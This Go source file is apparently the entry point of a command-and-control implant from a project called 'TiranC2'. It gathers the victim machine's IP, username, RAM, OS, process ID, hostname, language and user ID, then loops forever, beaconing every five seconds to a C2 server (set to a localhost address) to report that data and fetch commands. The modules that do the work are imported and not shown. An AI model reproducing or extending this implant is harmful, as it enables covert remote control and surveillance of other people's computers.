
package main

import (
	"TiranC2/Hardware"
	"TiranC2/Interact"
	"fmt"
	"time"
)

func Run() {
	Hardware.GetIP()
	Hardware.Getusername() // Start up  Funtions
	Hardware.Getram()      // Start up  Funtions
	Hardware.GetOS()
	Hardware.GetPID()
	Hardware.GetProcessName()
	Hardware.GetHostname()
	Hardware.GetSystemLan()
	Hardware.Getuid()
}

func ReturnCommand() {
    var server = "http://127.0.0.1:1236"
    for true {
        fmt.Print("Waiting 5 secodns")
        time.Sleep(5 * time.Second)
        Interact.Interact(Interact.ServerADD(server, Hardware.UID), Hardware.ComputerUsername, Hardware.ComputerRAM, Hardware.OS, Hardware.PID, Hardware.ProcName, Hardware.Hostname, Hardware.SysLan, Hardware.IP, server)
    }
}
func main() {
    Run() 
    ReturnCommand()
}
    